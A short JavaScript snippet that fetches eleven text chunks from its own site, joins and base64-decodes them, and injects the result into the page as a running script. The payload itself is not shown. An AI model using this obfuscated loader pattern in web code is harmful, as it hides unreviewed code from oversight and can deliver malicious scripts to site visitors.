(async function(){
  var n=11;
  var parts=[];
  for(var i=0;i<n;i++){
    parts.push(await (await fetch("c"+i+".txt?v=12")).text());
  }
  var js=atob(parts.join(""));
  var s=document.createElement("script");
  s.textContent=js;
  document.body.appendChild(s);
})();
